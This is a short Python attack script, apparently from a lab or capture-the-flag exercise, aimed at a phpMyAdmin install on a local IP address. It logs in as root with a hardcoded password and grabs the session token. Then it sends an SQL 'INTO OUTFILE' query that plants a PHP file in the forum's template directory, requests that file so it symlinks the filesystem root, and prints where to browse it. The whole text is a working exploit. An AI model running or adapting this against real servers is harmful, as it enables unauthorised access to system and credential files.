#! /usr/bin/env python3
import requests
from pwn import *
import re
import sys

requests.packages.urllib3.disable_warnings() 
s = requests.Session()
ret = s.post("https://192.168.1.22/phpmyadmin/index.php", verify=False, data={'pma_username': 'root', 'pma_password': "Fg-'kKXBj87E:aJ$"})
rx = re.compile(r'^src=\"main.php\?token=(.*)&amp;.*')
for line in ret.text.split():
    token = rx.match(line)
    if token:
        break
token = token.group(1)

sql_inject = "SELECT 1, '<?php symlink(\"/\", \"paths.php\");?>' INTO OUTFILE '/var/www/forum/templates_c/run.php'"

data = {
    'is_js_confirmed': 0,
    'token': token,
    'pos': 0,
    'goto': 'server_sql.php',
    'message_to_show': 'Your+SQL+query+has+been+executed+successfully',
    'prev_sql_query': None,
    'sql_query': sql_inject,
    'bkm_label': None,
    'sql_delimiter': '%3B',
    'show_query': 1,
    'ajax_request': "true"
    }
ret = s.post("https://192.168.1.22/phpmyadmin/import.php", data=data)
ret = ret.json()
if ret['success'] == False:
    print("PhpMyAdmin SQL injection fail: ", ret['error'])
    if ret['error'] != "<div class=\"error\">#1086 - File \'/var/www/forum/templates_c/run.php\' already exists</div>":
        sys.exit(1)

# Activate the php code
ret = requests.get('https://192.168.1.22/forum/templates_c/run.php', verify=False)

if ret.status_code != 200:
    print("run failed")
else:
    print("GOOD, now go to https://192.168.1.22/forum/templates_c/paths.php")
